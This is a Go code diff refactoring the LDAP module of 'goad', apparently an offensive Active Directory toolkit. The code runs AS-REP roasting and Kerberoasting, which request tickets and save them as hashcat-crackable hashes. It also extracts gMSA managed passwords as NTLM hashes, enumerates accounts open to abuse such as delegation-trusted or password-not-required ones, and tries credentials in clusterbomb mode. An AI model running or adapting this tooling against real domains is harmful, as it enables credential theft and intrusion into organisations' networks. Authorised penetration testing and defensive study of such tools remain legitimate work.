@@ -8,6 +8,7 @@ import (
 	"github.com/5amu/goad/internal/printer"
 	"github.com/5amu/goad/internal/utils"
 	"github.com/5amu/goad/pkg/kerberos"
+	"github.com/5amu/goad/pkg/mstypes"
 	"github.com/5amu/goad/pkg/smb"
 	"github.com/go-ldap/ldap/v3"
 )
@@ -68,92 +69,88 @@ type Options struct {
 }
 
 func (o *Options) getFunction() func(string) {
-	if o.CustomQuery.SearchFilter != "" && o.CustomQuery.Attributes != "" {
-		o.filter = o.CustomQuery.SearchFilter
-		o.attributes = strings.Split(o.CustomQuery.Attributes, ",")
-		return o.enumeration
-	}
 	if o.Hashes.AsrepRoast != "" {
+		o.filter = JoinFilters(
+			FilterIsUser,
+			UACFilter(DONT_REQ_PREAUTH),
+		)
 		return o.asreproast
-	}
-	if o.Hashes.Kerberoast != "" {
+	} else if o.Hashes.Kerberoast != "" {
+		o.filter = JoinFilters(
+			FilterIsUser,
+			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
+		)
 		return o.kerberoast
 	}
+
 	if o.Enum.GetSID {
-		return o.domainSID
-	}
-	if o.Enum.TrustedForDelegation {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsUser,
-			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
-			ldap.UACFilter(ldap.TRUSTED_FOR_DELEGATION),
+		o.filter = UACFilter(SERVER_TRUST_ACCOUNT)
+		o.attributes = []string{ObjectSid}
+		return o.enumeration
+	} else if o.Enum.TrustedForDelegation {
+		o.filter = JoinFilters(
+			FilterIsUser,
+			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
+			UACFilter(TRUSTED_FOR_DELEGATION),
 		)
 		return o.enumeration
-	}
-	if o.Enum.PasswordNotRequired {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsUser,
-			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
-			ldap.UACFilter(ldap.PASSWD_NOTREQD),
+	} else if o.Enum.PasswordNotRequired {
+		o.filter = JoinFilters(
+			FilterIsUser,
+			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
+			UACFilter(PASSWD_NOTREQD),
 		)
 		return o.enumeration
-	}
-	if o.Enum.Users {
-		o.filter = ldap.FilterIsUser
+	} else if o.Enum.Users {
+		o.filter = FilterIsUser
 		return o.enumeration
-	}
-	if o.Enum.Computers {
-		o.filter = ldap.FilterIsComputer
+	} else if o.Enum.Computers {
+		o.filter = FilterIsComputer
 		return o.enumeration
-	}
-	if o.Enum.User != "" {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsUser,
-			ldap.NewFilter(ldap.SAMAccountName, o.Enum.User),
+	} else if o.Enum.User != "" {
+		o.filter = JoinFilters(
+			FilterIsUser,
+			NewFilter(SAMAccountName, o.Enum.User),
 		)
 		return o.enumeration
-	}
-	if o.Enum.ActiveUsers {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsUser,
-			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
+	} else if o.Enum.ActiveUsers {
+		o.filter = JoinFilters(
+			FilterIsUser,
+			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
 		)
 		return o.enumeration
-	}
-	if o.Enum.Groups {
-		o.filter = ldap.FilterIsGroup
+	} else if o.Enum.Groups {
+		o.filter = FilterIsGroup
 		return o.enumeration
-	}
-	if o.Enum.DCList {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsComputer,
-			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
-			ldap.UACFilter(ldap.SERVER_TRUST_ACCOUNT),
+	} else if o.Enum.DCList {
+		o.filter = JoinFilters(
+			FilterIsComputer,
+			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
+			UACFilter(SERVER_TRUST_ACCOUNT),
 		)
 		return o.enumeration
-	}
-	if o.Enum.PasswordNeverExpires {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsUser,
-			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
-			ldap.UACFilter(ldap.DONT_EXPIRE_PASSWORD),
+	} else if o.Enum.PasswordNeverExpires {
+		o.filter = JoinFilters(
+			FilterIsUser,
+			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
+			UACFilter(DONT_EXPIRE_PASSWORD),
 		)
 		return o.enumeration
-	}
-	if o.Enum.AdminCount {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsUser,
-			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
-			ldap.FilterIsAdmin,
+	} else if o.Enum.AdminCount {
+		o.filter = JoinFilters(
+			FilterIsUser,
+			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
+			FilterIsAdmin,
 		)
 		return o.enumeration
+	} else if o.Enum.GMSA {
+		o.filter = FilterGMSA
+		o.attributes = []string{SAMAccountName, ManagedPassword}
+		return o.enumeration
 	}
-	if o.Enum.GMSA {
-		return o.gmsa
-	}
-	return func(s string) {
-		_, _, _ = o.authenticate(s)
-	}
+
+	o.filter = o.CustomQuery.SearchFilter
+	return o.enumeration
 }
 
 func (o *Options) Run() (err error) {
@@ -162,14 +159,55 @@ func (o *Options) Run() (err error) {
 		o.Connection.Port,
 	)
 
-	var f func(string) = o.getFunction()
-
 	o.credentials = utils.NewCredentialsDispacher(
 		o.Connection.Username,
 		o.Connection.Password,
 		o.Connection.NTLM,
 		utils.Clusterbomb,
 	)
+
+	if o.CustomQuery.Attributes == "" {
+		o.attributes = []string{
+			SAMAccountName,
+			Description,
+		}
+	} else {
+		tmp := strings.Split(o.CustomQuery.Attributes, ",")
+		for _, a := range tmp {
+			switch strings.ToLower(a) {
+			case strings.ToLower(SAMAccountName):
+				o.attributes = append(o.attributes, SAMAccountName)
+			case strings.ToLower(ServicePrincipalName):
+				o.attributes = append(o.attributes, ServicePrincipalName)
+			case strings.ToLower(ObjectSid):
+				o.attributes = append(o.attributes, ObjectSid)
+			case strings.ToLower(AdminCount):
+				o.attributes = append(o.attributes, AdminCount)
+			case strings.ToLower(DistinguishedName):
+				o.attributes = append(o.attributes, DistinguishedName)
+			case strings.ToLower(OperatingSystem):
+				o.attributes = append(o.attributes, OperatingSystem)
+			case strings.ToLower(OperatingSystemServicePack):
+				o.attributes = append(o.attributes, OperatingSystemServicePack)
+			case strings.ToLower(OperatingSystemVersion):
+				o.attributes = append(o.attributes, OperatingSystemVersion)
+			case strings.ToLower(PasswordLastSet):
+				o.attributes = append(o.attributes, PasswordLastSet)
+			case strings.ToLower(LastLogon):
+				o.attributes = append(o.attributes, LastLogon)
+			case strings.ToLower(MemberOf):
+				o.attributes = append(o.attributes, MemberOf)
+			case strings.ToLower(Description):
+				o.attributes = append(o.attributes, Description)
+			case strings.ToLower(ManagedPassword):
+				o.attributes = append(o.attributes, ManagedPassword)
+			default:
+				o.attributes = append(o.attributes, a)
+			}
+		}
+	}
+
+	var f func(string) = o.getFunction()
 
 	var wg sync.WaitGroup
 	for target := range o.target2SMBInfo {
@@ -225,11 +263,6 @@ func (o *Options) asreproast(target string) {
 	}
 	defer lclient.Close()
 
-	ldapFilter := JoinFilters(
-		FilterIsUser,
-		UACFilter(DONT_REQ_PREAUTH),
-	)
-
 	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
 	if err != nil {
 		prt.StoreFailure(err.Error())
@@ -239,18 +272,28 @@ func (o *Options) asreproast(target string) {
 	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)
 
 	var hashes []string
-	err = lclient.FindADObjectsWithCallback(ldapFilter, func(obj ldap.ADObject) error {
-		asrep, err := krb5client.GetAsReqTgt(obj.SAMAccountName)
+	err = FindObjectsWithCallback(lclient, o.Connection.Domain, o.filter, func(m map[string]interface{}) error {
+		samaccountname, ok := m[SAMAccountName]
+		if !ok {
+			return nil
+		}
+		name := UnpackToString(samaccountname)
+		asrep, err := krb5client.GetAsReqTgt(name)
 		if err != nil {
 			return err
 		}
 		hash := kerberos.ASREPToHashcat(*asrep.Ticket)
-		prt.Store(obj.SAMAccountName, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
+		prt.Store(name, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
 		hashes = append(hashes, hash)
 		return nil
-	})
+	}, SAMAccountName)
+
 	if err != nil {
 		prt.StoreFailure(err.Error())
+		return
+	}
+
+	if len(hashes) == 0 {
 		return
 	}
 
@@ -272,11 +315,6 @@ func (o *Options) kerberoast(target string) {
 		return
 	}
 	defer lclient.Close()
-
-	ldapFilter := JoinFilters(
-		FilterIsUser,
-		NegativeFilter(UACFilter(ACCOUNTDISABLE)),
-	)
 
 	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
 	if err != nil {
@@ -320,27 +358,6 @@ func (o *Options) kerberoast(target string) {
 		return nil
 
 	}, SAMAccountName, ServicePrincipalName)
-
-	err = lclient.FindADObjectsWithCallback(ldapFilter, func(obj ldap.ADObject) error {
-		if len(obj.ServicePrincipalName) == 0 {
-			return nil
-		}
-
-		for i, spn := range obj.ServicePrincipalName {
-			tgs, err := krb5client.GetServiceTicket(obj.SAMAccountName, spn)
-			if err != nil {
-				return err
-			}
-
-			hash := kerberos.TGSToHashcat(tgs.Ticket, obj.SAMAccountName)
-			prt.Store(obj.SAMAccountName, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
-
-			if i == 0 {
-				hashes = append(hashes, hash)
-			}
-		}
-		return nil
-	})
 	if err != nil {
 		prt.StoreFailure(err.Error())
 		return
@@ -349,6 +366,7 @@ func (o *Options) kerberoast(target string) {
 	if len(hashes) == 0 {
 		return
 	}
+
 	prt.Store("Saving hashes to", o.Hashes.Kerberoast)
 	err = utils.WriteLines(hashes, o.Hashes.Kerberoast)
 	if err != nil {
@@ -367,82 +385,27 @@ func (o *Options) enumeration(target string) {
 	}
 	defer lclient.Close()
 
-	err = lclient.FindADObjectsWithCallback(o.filter, func(obj ldap.ADObject) error {
-		if o.CustomQuery.Attributes == "" {
-			prt.Store(obj.SAMAccountName, obj.Description)
-		} else {
-			var toStore []string
-			attrs := strings.Split(o.CustomQuery.Attributes, ",")
-			for _, attr := range attrs {
-				switch strings.ToLower(attr) {
-				case strings.ToLower(ldap.DistinguishedName):
-					toStore = append(toStore, obj.DistinguishedName)
-				case strings.ToLower(ldap.SAMAccountName):
-					toStore = append(toStore, obj.SAMAccountName)
-				case strings.ToLower(ldap.PasswordLastSet):
-					toStore = append(toStore, obj.PWDLastSet)
-				case strings.ToLower(ldap.LastLogon):
-					toStore = append(toStore, obj.LastLogon)
-				case strings.ToLower(ldap.Description):
-					toStore = append(toStore, obj.Description)
-				case strings.ToLower(ldap.MemberOf):
-					toStore = append(toStore, fmt.Sprint(obj.MemberOf))
-				case strings.ToLower(ldap.ServicePrincipalName):
-					toStore = append(toStore, fmt.Sprint(obj.ServicePrincipalName))
-				}
+	err = FindObjectsWithCallback(lclient, o.Connection.Domain, o.filter, func(m map[string]interface{}) error {
+		var data []string
+		for _, a := range o.attributes {
+			switch a {
+			case LastLogon, PasswordLastSet:
+				data = append(data, DecodeADTimestamp(UnpackToString(m[a])))
+			case ObjectSid:
+				data = append(data, DecodeSID(UnpackToString(m[a])))
+			case ManagedPassword:
+				d := UnpackToString(m[ManagedPassword])
+				blob := mstypes.NewMSDSManagedPasswordBlob([]byte(d))
+				data = append(data, mstypes.HashDataNTLM(blob.CurrentPassword))
+			default:
+				data = append(data, UnpackToString(m[a]))
 			}
-			prt.Store(toStore...)
 		}
-		return err
-	})
+		prt.Store(data...)
+		return nil
+	}, o.attributes...)
 	if err != nil {
 		prt.StoreFailure(err.Error())
 		return
-	}
-}
-
-func (o *Options) domainSID(target string) {
-	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
-	defer prt.PrintStored(&o.printMutex)
-
-	lclient, _, err := o.authenticate(target)
-	if err != nil {
-		prt.StoreFailure(err.Error())
-		return
-	}
-	defer lclient.Close()
-
-	sid, err := lclient.GetDomainSID()
-	if err != nil {
-		prt.StoreFailure(err.Error())
-		return
-	}
-
-	prt.Store(sid)
-}
-
-func (o *Options) gmsa(target string) {
-	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
-	defer prt.PrintStored(&o.printMutex)
-
-	lclient, _, err := o.authenticate(target)
-	if err != nil {
-		prt.StoreFailure(err.Error())
-		return
-	}
-	defer lclient.Close()
-
-	gmsa, err := lclient.GetGMSA()
-	if err != nil {
-		prt.StoreFailure(err.Error())
-		return
-	}
-
-	if len(gmsa) > 0 {
-		prt.StoreInfo(fmt.Sprintf("Found GMSA Passwords: %d", len(gmsa)))
-	}
-
-	for _, g := range gmsa {
-		prt.Store(fmt.Sprintf("Account: %s", g.SAMAccountName), fmt.Sprintf("NTLM: %s", g.NTLM))
 	}
 }
